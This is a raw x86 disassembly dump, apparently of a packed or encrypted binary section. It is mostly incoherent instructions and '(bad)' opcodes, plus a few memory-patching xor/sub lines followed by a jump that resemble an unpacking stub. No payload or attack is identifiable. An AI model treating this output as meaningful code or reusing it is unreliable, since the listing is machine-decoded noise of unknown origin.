  41b096:	sar    DWORD PTR [eax-0x2f11e954],0x17
  41b09d:	lods   eax,DWORD PTR ds:[esi]
  41b09e:	cmp    eax,0x2d0b07d3
  41b0a3:	push   0xca383f46
  41b0a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0a9:	call   0x775f:0xf5063f77
  41b0b0:	fwait
  41b0b1:	dec    esi
  41b0b2:	retf   0xbcab
  41b0b5:	dec    eax
  41b0b6:	cmp    eax,0xed69190e
  41b0bb:	mov    bl,0xb7
  41b0bd:	sbb    esi,DWORD PTR [edi]
  41b0bf:	adc    eax,0x8d59fc18
  41b0c4:	push   ecx
  41b0c5:	mov    al,ds:0x881941fb
  41b0ca:	xchg   esi,eax
  41b0cb:	not    esp
  41b0cd:	pop    esi
  41b0ce:	xchg   esp,eax
  41b0cf:	add    eax,0xb683fc2b
  41b0d4:	push   ecx
  41b0d5:	call   0x4827cc08
  41b0da:	out    0x8,eax
  41b0dc:	push   cs
  41b0dd:	dec    esi
  41b0de:	out    dx,al
  41b0df:	fisttp QWORD PTR ds:0x8422cd57
  41b0e5:	psubd  mm3,QWORD PTR [ebp-0x651fb223]
  41b0ec:	leave  
  41b0ed:	xchg   ebp,eax
  41b0ee:	cld    
  41b0ef:	xchg   edi,eax
  41b0f0:	or     eax,0x55b4df
  41b0f5:	fs pushf 
  41b0f7:	data16 mov cl,0x27
  41b0fa:	mov    ds:0xb88604f2,al
  41b0ff:	mov    eax,0x8346532c
  41b104:	inc    esi
  41b105:	inc    eax
  41b106:	ret    0x9118
  41b109:	add    DWORD PTR [ecx+0x7cc105b8],ebp
  41b10f:	sub    BYTE PTR [edi+0x8],0xcd
  41b113:	(bad)  
  41b114:	out    dx,eax
  41b115:	push   eax
  41b116:	cli    
  41b117:	out    dx,al
  41b118:	mov    ebx,0xe40e63d7
  41b11d:	dec    eax
  41b11e:	cli    
  41b11f:	push   ebp
  41b120:	sub    eax,0x44688625
  41b125:	cli    
  41b126:	mov    edx,0x54057388
  41b12b:	sahf   
  41b12c:	ret    
  41b12d:	sub    esp,esp
  41b12f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b130:	xchg   ebx,eax
  41b131:	popa   
  41b132:	add    eax,0x220fab04
  41b137:	fistp  WORD PTR [edi+0x24]
  41b13a:	clc    
  41b13b:	icebp  
  41b13c:	fwait
  41b13d:	jae    0x41b0cc
  41b13f:	fstp   QWORD PTR [edi-0x17c6b791]
  41b145:	popa   
  41b146:	and    dh,BYTE PTR [edx-0x2c]
  41b149:	fwait
  41b14a:	das    
  41b14b:	ficomp WORD PTR ds:0xd97f47fc
  41b151:	shl    al,0x2a
  41b154:	xchg   BYTE PTR [ebx+ebp*8-0xca59bae],ah
  41b15b:	xlat   BYTE PTR ds:[ebx]
  41b15c:	pop    esi
  41b15d:	cli    
  41b15e:	sbb    esp,DWORD PTR [ebx-0x4ccfbcf9]
  41b164:	jne    0x41b1b1
  41b166:	loop   0x41b167
  41b168:	les    eax,FWORD PTR [ebx+0x3da3d980]
  41b16e:	adc    ebx,eax
  41b170:	adc    BYTE PTR [ecx+0x56],cl
  41b173:	push   ecx
  41b174:	sub    DWORD PTR ds:0x4229c6,0x422892
  41b17e:	push   eax
  41b17f:	xor    DWORD PTR ds:0x4228e6,0x42296a
  41b189:	push   edx
  41b18a:	jmp    0x41b5d3
  41b18f:	xor    DWORD PTR [esi],ecx
  41b191:	inc    esi
  41b192:	or     ebx,DWORD PTR [eax]
  41b194:	xor    ah,BYTE PTR [ecx]
  41b196:	and    al,0xeb
  41b198:	fwait
  41b199:	ds push 0xa81eaca4
  41b19f:	jge    0x41b1b6
  41b1a1:	or     al,0x16
  41b1a3:	(bad)  
  41b1a4:	push   cs
  41b1a5:	push   ss
  41b1a6:	push   ss
  41b1a7:	and    DWORD PTR [edi-0x12],0x600c4d1f
  41b1ae:	dec    edx
  41b1af:	out    0x2e,al
  41b1b1:	aam    0xf6
  41b1b3:	sub    ebx,eax
  41b1b5:	jnp    0x41b1ba
  41b1b7:	cmovnp edx,DWORD PTR [edx]
  41b1ba:	sbb    al,0x81
  41b1bc:	jmp    0x3078fab2
  41b1c1:	xlat   BYTE PTR ds:[ebx]
  41b1c2:	dec    esp
  41b1c3:	dec    ebx
  41b1c4:	xor    ebx,DWORD PTR [esi+ecx*2+0xecd4f5]
  41b1cb:	add    bh,0x78
  41b1ce:	pop    eax
  41b1cf:	icebp  
  41b1d0:	loope  0x41b1c1
  41b1d2:	int    0xc6
  41b1d4:	rcl    BYTE PTR [edi+0x9cfdb7c],0x7d
  41b1db:	xchg   dl,dh
  41b1dd:	jnp    0x41b19b
  41b1df:	sub    BYTE PTR [edx],ch
  41b1e1:	out    dx,al
  41b1e2:	adc    eax,0xf129bd82
  41b1e7:	or     al,0x2e
  41b1e9:	xor    edi,DWORD PTR ds:0x87d7882d
  41b1ef:	or     esi,ebp
  41b1f1:	or     esp,0xddbffdd7
  41b1f7:	cmc    
  41b1f8:	xor    ch,0x9f
  41b1fb:	adc    eax,0x98ec4472
  41b200:	and    BYTE PTR gs:[ebx-0x765a2081],0xec
  41b208:	retf   0x19d8
  41b20b:	cs test al,0x4a
  41b20e:	sub    al,BYTE PTR [ebx+0x3b]
  41b211:	(bad)
  41b214:	lea    edi,[edx]
  41b216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b217:	cmp    ebx,DWORD PTR [eax-0x6bf3eed4]
  41b21d:	mov    ch,0x70
  41b21f:	sbb    BYTE PTR [ebx+esi*8],ch
  41b222:	push   0x13
  41b224:	sub    eax,0x5b7a1e81
  41b229:	scas   al,BYTE PTR es:[edi]
  41b22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b22b:	or     al,0x72
  41b22d:	arpl   WORD PTR [ecx+0x2aacf698],bx
  41b233:	(bad)  
  41b234:	jo     0x41b295
  41b236:	mov    ds,WORD PTR [eax+edx*4+0x15]
  41b23a:	mov    al,0x3c
  41b23c:	shrd   eax,ebx,0xfb
  41b240:	cmc    
  41b241:	sbb    ah,BYTE PTR [esi+0x6b83526e]
  41b247:	ficom  WORD PTR [edi-0xa]
  41b24a:	xor    eax,DWORD PTR [esi]
  41b24c:	inc    edi
  41b24d:	ins    DWORD PTR es:[edi],dx
  41b24e:	out    0xb9,al
  41b250:	scas   al,BYTE PTR es:[edi]
  41b251:	fwait
  41b252:	cmp    ah,cl
  41b254:	stos   DWORD PTR es:[edi],eax
  41b255:	push   cs
  41b256:	(bad)  
  41b257:	retf   
  41b258:	ss xchg ebp,eax
  41b25a:	mov    esi,es
  41b25c:	fs ins DWORD PTR es:[edi],dx
  41b25e:	jns    0x41b211
  41b260:	scas   al,BYTE PTR es:[edi]
  41b261:	shl    edx,1
  41b263:	cli    
  41b264:	leave  
  41b265:	pop    ss
  41b266:	leave  
  41b267:	inc    edi
  41b268:	imul   eax,esi,0x4e9d5e62
  41b26e:	dec    edi
  41b26f:	xor    al,0xf4
  41b271:	gs sti 
  41b273:	(bad)  [esp+ebx*1+0x7e]
  41b277:	xor    eax,DWORD PTR [esi]
  41b279:	nop
  41b27a:	sub    BYTE PTR [ebx],bh
  41b27c:	xchg   esp,eax
  41b27d:	pop    ebp
  41b27e:	adc    al,ah
  41b280:	call   0x3b91:0x2a6e3775
  41b287:	in     al,dx
  41b288:	sub    eax,0x36b5c0b
  41b28d:	cmp    al,0x76
  41b28f:	shl    esp,cl
  41b291:	sbb    edi,ebx
  41b293:	fldcw  WORD PTR [esi]
  41b295:	xchg   esi,eax
  41b296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b297:	ds aas 
  41b299:	or     BYTE PTR [edi],bl
  41b29b:	cwde   
  41b29c:	rcr    BYTE PTR [edi+edx*1+0x3c],1
  41b2a0:	test   DWORD PTR [edi-0x74],esi
  41b2a3:	mov    ah,0x3a
  41b2a5:	hlt    
  41b2a6:	sub    dh,ch
  41b2a8:	sbb    ax,0x3d8c
  41b2ac:	mov    eax,0x9600d688
  41b2b1:	lock jmp 0xac41:0x9451d4b3
  41b2b9:	jne    0x41b28d
  41b2bb:	add    ch,dl
  41b2bd:	dec    esi
  41b2be:	mov    dh,0x20
  41b2c0:	shr    BYTE PTR [edx-0x3787053f],1
  41b2c6:	mov    cl,0xe3
  41b2c8:	daa    
  41b2c9:	mov    BYTE PTR [edi+0x46],ah
  41b2cc:	ret    0x246e
  41b2cf:	sbb    al,0xe0
  41b2d1:	fwait
  41b2d2:	sbb    al,0x4d
  41b2d4:	aad    0xeb
  41b2d6:	fmul   st(1),st
  41b2d8:	pop    ss
  41b2d9:	aad    0xbf
  41b2db:	mov    cl,0x8
  41b2dd:	dec    edi
  41b2de:	ret    0x3069
  41b2e1:	inc    ebx
  41b2e2:	jecxz  0x41b2bd
  41b2e4:	scas   eax,DWORD PTR es:[edi]
  41b2e5:	dec    esp
  41b2e6:	test   al,0xc
  41b2e8:	and    BYTE PTR [ebx],bh
  41b2ea:	std    
  41b2eb:	das    
  41b2ec:	in     eax,dx
  41b2ed:	xchg   ecx,eax
  41b2ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2f0:	cli    
  41b2f1:	jg     0x41b35e
  41b2f3:	lahf   
  41b2f4:	shl    BYTE PTR [ebx-0x5243cb9d],cl
  41b2fa:	inc    edx
  41b2fb:	inc    eax
  41b2fc:	adc    BYTE PTR [ecx],bh
  41b2fe:	add    esi,DWORD PTR [edx]
  41b300:	into   
  41b301:	add    al,0x1
  41b303:	lods   eax,DWORD PTR ds:[esi]
  41b304:	out    dx,eax
  41b305:	and    eax,0x98275e45
  41b30a:	xchg   DWORD PTR [ebp-0x48473bb6],ebx
  41b310:	jo     0x41b387
  41b312:	push   ebp
  41b313:	and    DWORD PTR [ecx-0x2a],eax
  41b316:	mov    ds:0xa2270c8e,al
  41b31b:	push   cs
  41b31c:	lock adc eax,0xf2da77bf
  41b322:	mov    al,0x1
  41b324:	push   esi
  41b325:	dec    esi
  41b326:	xchg   DWORD PTR [eax+0x2aa4e7f4],eax
  41b32c:	int3   
  41b32d:	jmpw   0xd3da
  41b331:	out    0x6f,eax
  41b333:	xchg   esp,eax
  41b334:	outs   dx,BYTE PTR ds:[si]
  41b336:	retf   
  41b337:	jne    0x41b2d0
  41b339:	aas    
  41b33a:	sbb    DWORD PTR fs:[ecx-0x5f2689c1],ebp
  41b341:	test   DWORD PTR [edi+0x23],0x170bb354
  41b348:	add    BYTE PTR [esi],0x75
  41b34b:	mov    dh,0x67
  41b34d:	jnp    0x41b31b
  41b34f:	lock cdq 
  41b351:	cmp    al,0xc6
  41b353:	call   0x6989:0x822df651
  41b35a:	inc    eax
  41b35b:	leave  
  41b35c:	test   eax,0xc1f027ac
  41b361:	retf   0x59b4
  41b364:	jo     0x41b301
  41b366:	cmc    
  41b367:	ror    ebp,1
  41b369:	adc    BYTE PTR [ebx+ebp*2-0x36f8de2f],al
  41b370:	mov    cs,WORD PTR [esi-0x28]
  41b373:	sbb    esp,DWORD PTR [ecx]
  41b375:	test   eax,0xc17ebf65
  41b37a:	out    dx,al
  41b37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b37c:	sub    DWORD PTR ds:0xf9c9e4cc,ecx
  41b382:	popw   es
  41b384:	mov    ecx,0x499ebeb8
  41b389:	cmp    al,0x9b
  41b38b:	jae    0x41b3b0
  41b38d:	xchg   ebx,eax
  41b38e:	shl    BYTE PTR [esi-0x64],0xbc
  41b392:	mov    edx,0xc9a21557
  41b397:	mov    bh,0xe3
  41b399:	pop    ebx
  41b39a:	fs das 
  41b39c:	sbb    eax,DWORD PTR [edx+0x59]
  41b39f:	data16 xor cl,cl
  41b3a2:	hlt    
  41b3a3:	mov    bl,0x9b
  41b3a5:	mov    dl,0x11
  41b3a7:	dec    ecx
  41b3a8:	mov    ecx,DWORD PTR [ecx-0x15]
  41b3ab:	cmp    eax,0x484b9e8b
  41b3b0:	inc    eax
  41b3b1:	mov    bl,0xcb
  41b3b3:	mov    BYTE PTR [edx-0x3b],dh
  41b3b6:	ss out dx,al
  41b3b8:	adc    al,0xa4
  41b3ba:	fstp   TBYTE PTR [edx-0x553b6fa7]
  41b3c0:	test   esi,0x24995705
  41b3c6:	sub    eax,0x1dae96f
  41b3cb:	mov    ds:0x9003b186,al
  41b3d0:	test   DWORD PTR [ecx],0x59ea6b74
  41b3d6:	dec    ebp
  41b3d7:	(bad)  
  41b3d8:	lods   al,BYTE PTR ds:[esi]
  41b3d9:	adc    BYTE PTR [ebx+0x3ced2426],bh
  41b3df:	push   0xd
  41b3e1:	scas   al,BYTE PTR es:[edi]
  41b3e2:	cmp    al,0xcc
  41b3e4:	std    
  41b3e5:	mov    dl,0x77
  41b3e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3e8:	mov    edi,0x52522300
  41b3ed:	and    esp,DWORD PTR [ecx]
  41b3ef:	sub    al,0x1a
  41b3f1:	es in  eax,dx
  41b3f3:	sbb    bh,BYTE PTR [edx-0xfd4b7a9]
  41b3f9:	(bad)  
  41b3fa:	imul   ebp,DWORD PTR [esi],0xffffffe3
  41b3fd:	je     0x41b381
  41b3ff:	jne    0x41b47c
  41b401:	mov    WORD PTR [esi],ss
  41b403:	fwait
  41b404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b405:	mov    DWORD PTR [eax],ebp
  41b407:	mov    ebx,0xfd97a4a4
  41b40c:	gs inc edi
  41b40e:	clc    
  41b40f:	push   ss
  41b410:	push   ds
  41b411:	jecxz  0x41b45b
  41b413:	mov    bl,BYTE PTR [ecx]
  41b415:	pop    ss
  41b416:	cs pop edi
  41b418:	ds into 
  41b41a:	(bad)  
  41b41b:	in     al,dx
  41b41c:	dec    ecx
  41b41d:	inc    esi
  41b41e:	xor    ebp,DWORD PTR [edi-0x38314b7a]
  41b424:	arpl   WORD PTR [esi-0x263ba37b],ax
  41b42a:	cli    
  41b42b:	shr    bl,cl
  41b42d:	inc    eax
  41b42e:	cld    
  41b42f:	mov    bl,BYTE PTR [edx-0x7a]
  41b432:	xor    dh,dh
  41b434:	call   FWORD PTR [edx]
  41b436:	fisttp DWORD PTR [ecx]
  41b438:	cdq    
  41b439:	push   esi
  41b43a:	ins    BYTE PTR es:[edi],dx
  41b43b:	jo     0x41b3f8
  41b43d:	repz adc eax,0xb5d78075
  41b443:	mov    esp,0x5d38e821
  41b448:	ins    BYTE PTR es:[edi],dx
  41b449:	call   0xd463:0xd7ba11af
  41b450:	xor    al,0xf2
  41b452:	xor    DWORD PTR [edx+0x4629d643],0x8746470f
  41b45c:	lds    ebp,FWORD PTR [esi]
  41b45e:	push   esp
  41b45f:	retf   0xdcf7
  41b462:	pop    edi
  41b463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b464:	je     0x41b446
  41b466:	xor    bh,ch
  41b468:	push   ecx
  41b469:	pop    esp
  41b46a:	scas   eax,DWORD PTR es:[edi]
  41b46b:	jnp    0x41b3fd
  41b46d:	in     eax,0x3f
  41b46f:	dec    ebp
  41b470:	jmp    0x41b4af
  41b472:	cdq    
  41b473:	aad    0x1b
  41b475:	ins    DWORD PTR es:[edi],dx
  41b476:	das    
  41b477:	leave  
  41b478:	add    al,BYTE PTR [ebx+0x147af75e]
  41b47e:	sub    dh,BYTE PTR [edx]
  41b480:	push   cs
  41b481:	mov    al,ds:0x4a39299f
  41b486:	jnp    0x41b4d9
  41b488:	fisttp WORD PTR [edi-0x31]
  41b48b:	mov    cl,0x2d
  41b48d:	pop    ds
  41b48e:	je     0x41b4c0
  41b490:	xchg   ecx,eax
  41b491:	jbe    0x41b4fa
  41b493:	loopne 0x41b479
  41b495:	adc    BYTE PTR [eax+ebx*8-0x23],cl
  41b499:	enter  0xf60f,0x85
  41b49d:	sub    bh,BYTE PTR [esi-0x376b336c]
  41b4a3:	retf   
  41b4a4:	jecxz  0x41b4e2
  41b4a6:	pushf  
  41b4a7:	push   ss
  41b4a8:	leave  
  41b4a9:	or     edx,DWORD PTR [edx]
  41b4ab:	lahf   
  41b4ac:	mov    edx,0xa1106477
  41b4b1:	ins    BYTE PTR es:[edi],dx
  41b4b2:	shr    BYTE PTR ds:0xc011c0a8,0xf
  41b4b9:	mov    dl,0xc2
  41b4bb:	sbb    BYTE PTR [edx],ah
  41b4bd:	call   0x3897610e
  41b4c2:	stos   DWORD PTR es:[edi],eax
  41b4c3:	sahf   
  41b4c4:	jg     0x41b52e
  41b4c6:	lods   al,BYTE PTR ds:[esi]
  41b4c7:	(bad)  
  41b4c8:	dec    esi
  41b4c9:	repnz ror BYTE PTR [edi],1
  41b4cc:	shr    BYTE PTR [edi+0x2d],0x6b
  41b4d0:	inc    esi
  41b4d1:	std    
  41b4d2:	mov    esp,0xd5e80164
  41b4d7:	jae    0x41b532
  41b4d9:	add    dl,bh
  41b4db:	or     BYTE PTR [ecx-0x20],bh
  41b4de:	mov    eax,0xf6479bac
  41b4e3:	lods   eax,DWORD PTR ds:[esi]
  41b4e4:	out    dx,eax
  41b4e5:	jno    0x41b4b5
  41b4e7:	xchg   ebp,eax
  41b4e8:	clc    
  41b4e9:	adc    al,0x1d
  41b4eb:	xchg   ecx,eax
  41b4ec:	jp     0x41b4dd
  41b4ee:	adc    eax,0xaed92527
  41b4f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4f4:	pop    eax
  41b4f5:	xchg   esi,eax
  41b4f6:	es nop
  41b4f8:	adc    eax,0xbd06895e
  41b4fd:	pop    ebp
  41b4fe:	out    0xd1,al
  41b500:	sub    dl,BYTE PTR [edi]
  41b502:	sub    edx,eax
  41b504:	xor    DWORD PTR [edx+0x58e1866b],esp
  41b50a:	mov    dl,0xf8
  41b50c:	jne    0x41b56b
  41b50e:	jne    0x41b559
  41b510:	loop   0x41b4e5
  41b512:	fwait
  41b513:	jecxz  0x41b571
  41b515:	add    esi,ebx
  41b517:	cs maxps xmm4,XMMWORD PTR fs:[esi+0x1c219c82]
  41b520:	push   esp
  41b521:	mov    ecx,DWORD PTR [ecx]
  41b523:	cmp    DWORD PTR [esi-0x7f],0x51fec0f7
  41b52a:	ins    DWORD PTR es:[edi],dx
  41b52b:	cdq    
  41b52c:	loope  0x41b4c7
  41b52e:	cwde   
  41b52f:	popa   
  41b530:	cmp    esi,DWORD PTR [ebx-0x306bf22d]
  41b536:	shl    DWORD PTR [edi],1
  41b538:	jb     0x41b5b2
  41b53a:	sub    DWORD PTR [ebx+eax*4],esi
  41b53d:	sbb    DWORD PTR [ebp-0x559db83d],edi
  41b543:	pop    ds
  41b544:	ds pop esp
  41b546:	sbb    bh,BYTE PTR [ecx]
  41b548:	mov    WORD PTR [eax+0xa],ds
  41b54b:	inc    edi
  41b54c:	mov    al,0x9d
  41b54e:	loopne 0x41b535
  41b550:	imul   ebp,ebx,0xa0fa60d2
  41b556:	cdq    
  41b557:	hlt    
  41b558:	dec    ecx
  41b559:	adc    DWORD PTR [ebx+eax*4-0x1fe11347],ebx
  41b560:	inc    edx
  41b561:	adc    BYTE PTR [edi+ecx*8+0x1c],dl
  41b565:	stos   DWORD PTR es:[edi],eax
  41b566:	or     DWORD PTR ds:0xd31e019a,0xd5b69d1c
  41b570:	sub    BYTE PTR [ebx-0x72],0x86
  41b574:	shl    DWORD PTR [ecx],1
  41b576:	mov    eax,ds:0x847ee07
  41b57b:	out    0xf6,eax
  41b57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b57e:	xor    eax,0xfcc5af04
  41b583:	adc    BYTE PTR [ecx],bl
  41b585:	push   esp
  41b586:	add    eax,0x41c96630
  41b58b:	int3   
  41b58c:	mov    al,0xf0
  41b58e:	mov    DWORD PTR [esi-0x74],ebp
  41b591:	loop   0x41b522
  41b593:	jb     0x41b5b1
  41b595:	nop
  41b596:	aas    
  41b597:	mov    ds:0xafd766b,eax
  41b59c:	int3   
  41b59d:	and    eax,0xa777a8c3
  41b5a2:	mov    al,0xdd
  41b5a4:	das    
  41b5a5:	and    BYTE PTR [ebx],ch
  41b5a7:	ins    DWORD PTR es:[edi],dx
  41b5a8:	ret    
  41b5a9:	stos   BYTE PTR es:[edi],al
  41b5aa:	loope  0x41b5ef
  41b5ac:	sbb    dl,bh
  41b5ae:	in     eax,dx
  41b5af:	cs mov edx,0x8c8dd596
  41b5b5:	rcr    eax,1
  41b5b7:	pop    ds
  41b5b8:	dec    edx
  41b5b9:	shl    DWORD PTR [esi+0x26],1
  41b5bc:	es jmp 0x279:0x161d19d1
  41b5c4:	and    DWORD PTR [edi+0x563409d],0xffffffd4
  41b5cb:	cmp    ah,BYTE PTR [ebp-0x2c]
  41b5ce:	push   esp
  41b5cf:	xlat   BYTE PTR ds:[ebx]
  41b5d0:	in     eax,dx
  41b5d1:	jno    0x41b612
  41b5d3:	call   0x41dfae
  41b5d8:	jmp    0x41ba21
  41b5dd:	push   cs
  41b5de:	adc    BYTE PTR [esi+edi*8+0x58],0xd3
  41b5e3:	fs xor ch,0xf0
  41b5e7:	and    al,0x68
  41b5e9:	fsubr  QWORD PTR [eax+ebx*4-0x4e]
  41b5ed:	sub    eax,0xc7160c0d
  41b5f2:	push   cs
  41b5f3:	push   ss
  41b5f4:	push   ss
  41b5f5:	and    BYTE PTR [esi-0x23],ah
  41b5f8:	fucom  st(6)
  41b5fa:	test   DWORD PTR [esi],0x8c540ad5
  41b600:	(bad)  
  41b601:	mov    BYTE PTR [ecx+0x3dc7dbfe],al
  41b607:	imul   edi,eax,0x0
  41b60a:	jecxz  0x41b675
  41b60c:	js     0x41b619
  41b60e:	mov    ebp,0x5d0d395c
  41b613:	test   DWORD PTR [esi+0x15117c56],esp
  41b619:	jnp    0x41b5fd
  41b61b:	out    0xf3,eax
  41b61d:	rol    DWORD PTR [ebx-0x21],0x94
  41b621:	mov    ecx,0x5005636a
  41b626:	gs pop ss
  41b628:	sub    al,0xe5
  41b62a:	loope  0x41b622
  41b62c:	retf   0xd01c
  41b62f:	jg     0x41b6ab
  41b631:	adc    dh,BYTE PTR [edx+0x1]
  41b634:	adc    DWORD PTR [ecx+0x63],edi
  41b637:	outs   dx,BYTE PTR ds:[esi]
  41b638:	(bad)  [ebx+0xf]
  41b63b:	or     DWORD PTR [ebp-0x51],esi
  41b63e:	or     DWORD PTR [ebx-0x40],ebx
  41b641:	in     al,dx
  41b642:	xchg   dl,dh
  41b644:	xchg   DWORD PTR [ebx+0x2c],esp
  41b647:	push   0xffb30f32
  41b64c:	or     al,0x2d
  41b64e:	mov    edi,0xc30a491d
  41b653:	xchg   esp,eax
  41b654:	mov    al,0xcb
  41b656:	shl    DWORD PTR [esi+0x245c8260],0x75
  41b65d:	xor    eax,DWORD PTR [esi-0x795c79c9]
  41b663:	pop    ds
  41b664:	out    dx,eax
  41b665:	adc    dl,dh
  41b667:	jno    0x41b62f
  41b669:	rcl    DWORD PTR [ebx+edx*8],0x86
  41b66d:	mov    al,0x2b
  41b66f:	test   BYTE PTR [ebx+0x69ce7ff5],0x9f
  41b676:	adc    ecx,DWORD PTR [edx]
  41b678:	and    DWORD PTR [ecx-0x71],ebp
  41b67b:	mov    ch,0x7d
  41b67d:	jg     0x41b64e
  41b67f:	popf   
  41b680:	les    esp,FWORD PTR [edx+0x15]
  41b683:	jo     0x41b6d2
  41b685:	sti    
  41b686:	popf   
  41b687:	push   0x5baf72d2
  41b68c:	jecxz  0x41b652
  41b68e:	mov    ds:0x5ca33e47,al
  41b693:	or     eax,0x6899ab95
  41b698:	mov    al,0x41
  41b69a:	jge    0x41b6a3
  41b69c:	dec    edx
  41b69d:	pop    es
  41b69e:	jecxz  0x41b66b
  41b6a0:	xor    ebp,esp
  41b6a2:	shl    dl,1
  41b6a4:	push   ss
  41b6a5:	sahf   
  41b6a6:	repz cmp eax,0xc226422d
  41b6ac:	ss leave 
  41b6ae:	nop
  41b6af:	clc    
  41b6b0:	ja     0x41b63a
  41b6b2:	push   cs
  41b6b3:	jne    0x41b6fc
  41b6b5:	pop    ds
  41b6b6:	loopne 0x41b71d
  41b6b8:	stos   BYTE PTR es:[edi],al
  41b6b9:	in     al,dx
  41b6ba:	(bad)
  41b6be:	(bad)
  41b6c2:	xchg   BYTE PTR [ebx-0x70],ah
  41b6c5:	aaa    
  41b6c6:	sbb    ebx,DWORD PTR [eax]
  41b6c8:	jle    0x41b6b7
  41b6ca:	jno    0x41b686
  41b6cc:	shr    ch,0x5d
  41b6cf:	xchg   DWORD PTR [esi-0x4d184fe6],edx
  41b6d5:	out    0x6,al
  41b6d7:	leave  
  41b6d8:	mov    al,BYTE PTR ds:0x8c9913f9
  41b6de:	imul   edi,DWORD PTR [ecx],0xfffffffb
  41b6e1:	bound  esp,QWORD PTR [eax+0x33]
  41b6e4:	or     DWORD PTR ds:0x879a463d,0x67
  41b6eb:	inc    eax
  41b6ec:	jp     0x41b70b
  41b6ee:	inc    ebx
  41b6ef:	(bad)  
  41b6f0:	mov    ch,0x13
  41b6f2:	cmp    dl,ah
  41b6f4:	push   cs
  41b6f5:	fmulp  st(4),st
  41b6f7:	ds sbb eax,0xf6552dbb
  41b6fd:	mov    ebx,0xde80555c
  41b702:	scas   al,BYTE PTR es:[edi]
  41b703:	pop    ds
  41b704:	aaa    
  41b705:	cmp    eax,0x91694c68
  41b70a:	jns    0x41b706
  41b70c:	inc    esi
  41b70d:	dec    ebx
  41b70e:	sar    BYTE PTR [ecx-0x6c9cf4f7],1
  41b714:	leave  
  41b715:	xor    DWORD PTR [eax-0xd],eax
  41b718:	adc    eax,DWORD PTR [edx]
  41b71a:	xlat   BYTE PTR ds:[ebx]
  41b71b:	cmp    ch,BYTE PTR ds:0x56d68718
  41b721:	push   ecx
  41b722:	xor    DWORD PTR ds:0x16d5c2eb,ebx
  41b728:	pop    eax
  41b729:	mov    edi,0xec87db35
  41b72e:	cdq    
  41b72f:	xor    BYTE PTR [esi+eax*4-0x3347f0a1],bh
  41b736:	push   ds
  41b737:	in     eax,0x6e
  41b739:	popa   
  41b73a:	(bad)  
  41b73c:	(bad)  
  41b73d:	xchg   ecx,eax
  41b73e:	leave  
  41b73f:	ficom  DWORD PTR [ebp+0x3467dcf0]
  41b745:	rol    BYTE PTR [ecx],0x79
  41b748:	dec    ecx
  41b749:	ja     0x41b776
  41b74b:	test   al,0x58
  41b74d:	push   cs
  41b74e:	jmp    0x41b742
  41b750:	or     BYTE PTR [edx+0x2b218ccd],dh
  41b756:	test   eax,0x30dec6df
  41b75b:	hlt    
  41b75c:	dec    eax
  41b75d:	mov    bl,0x13
  41b75f:	popa   
  41b760:	int3   
  41b761:	and    ebp,DWORD PTR [eax]
  41b763:	jmp    0x6412:0x7cfae628
  41b76a:	jae    0x41b736
  41b76c:	mov    ebx,ebx
  41b76e:	sub    eax,0x5b5d2663
  41b773:	xchg   esp,eax
  41b774:	adc    eax,0xbcdf8f02
  41b779:	jle    0x41b7bf
  41b77b:	cmp    BYTE PTR [esi],ah
  41b77d:	add    DWORD PTR [edx-0x57],0xfffffff4
  41b781:	lods   al,BYTE PTR ds:[esi]
  41b782:	cmp    DWORD PTR [edx],ebp
  41b784:	out    dx,eax
  41b785:	mov    esi,0xe985503d
  41b78a:	iret   
  41b78b:	ins    BYTE PTR es:[edi],dx
  41b78c:	xor    al,0x77
  41b78e:	pcmpeqd mm7,QWORD PTR [ecx]
  41b791:	(bad)
  41b795:	and    eax,0xfd44673f
  41b79a:	mov    ds:0x6f78f673,al
  41b79f:	mov    eax,ds:0x806a9797
  41b7a4:	test   eax,0xb8780217
  41b7a9:	xchg   ecx,eax
  41b7aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ab:	js     0x41b7e0
  41b7ad:	iret   
  41b7ae:	and    BYTE PTR [ebx],0x46
  41b7b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7b2:	mov    esi,0xe3d84bc6
  41b7b7:	nop
  41b7b8:	dec    edx
  41b7b9:	sbb    DWORD PTR [edx+0x52],edx
  41b7bc:	inc    esi
  41b7bd:	lahf   
  41b7be:	rcr    BYTE PTR [eax-0x16],cl
  41b7c1:	push   edx
  41b7c2:	lods   al,BYTE PTR ds:[esi]
  41b7c4:	push   esp
  41b7c6:	add    eax,0x5bb8267
  41b7cb:	ja     0x41b78a
  41b7cd:	call   0x64198bf5
  41b7d2:	cmc    
  41b7d3:	pop    eax
  41b7d4:	in     eax,0xd
  41b7d6:	sbb    BYTE PTR [ebx+0x26],0x2e
  41b7da:	sub    BYTE PTR [ecx],dh
  41b7dc:	das    
  41b7dd:	add    DWORD PTR [edi+0x66],edi
  41b7e0:	sahf   
  41b7e1:	push   ebp
  41b7e2:	jb     0x41b7f3
  41b7e4:	sbb    dl,BYTE PTR [ebp-0x3c]
  41b7e7:	and    BYTE PTR [edx-0x7e],bl
  41b7ea:	outs   dx,DWORD PTR ds:[esi]
  41b7eb:	pop    ds
  41b7ec:	adc    esi,ebx
  41b7ee:	jge    0x41b78f
  41b7f0:	jmp    0xd1a877c
  41b7f5:	mov    ds:0xffb8c6fc,eax
  41b7fa:	cmp    esi,eax
  41b7fc:	and    DWORD PTR [ebp+0xc],edx
  41b7ff:	mov    dh,BYTE PTR [eax-0x393b4be3]
  41b805:	fcomp  QWORD PTR [ebx-0x3bb585ed]
  41b80b:	and    DWORD PTR [eax],edx
  41b80d:	fist   DWORD PTR [eax-0x6c]
  41b810:	jmp    0xb0c31b
  41b815:	dec    esp
  41b816:	sub    dl,dl
  41b818:	push   0x2f308806
  41b81d:	or     al,0x93
